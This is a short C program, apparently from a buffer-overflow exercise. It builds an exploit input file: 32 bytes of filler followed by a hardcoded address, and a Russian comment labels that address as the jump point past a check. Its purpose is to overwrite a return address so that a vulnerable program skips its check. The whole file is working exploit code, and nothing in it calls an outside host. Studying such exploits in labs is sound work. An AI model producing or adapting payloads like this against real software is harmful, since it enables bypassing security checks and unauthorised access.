#include <stdio.h>
#include <string.h>

int main(void)
{
    char output[64] = "12345678901234567890123456789012";
    /* Адрес перехода в точку после проверки */
    long newaddress = 0x000000000040118a;
    memcpy(output+32, &newaddress, sizeof(long));
    FILE *pf = fopen("input.txt", "w");
    fwrite(output, sizeof(char), 64, pf);
    fclose(pf);
}
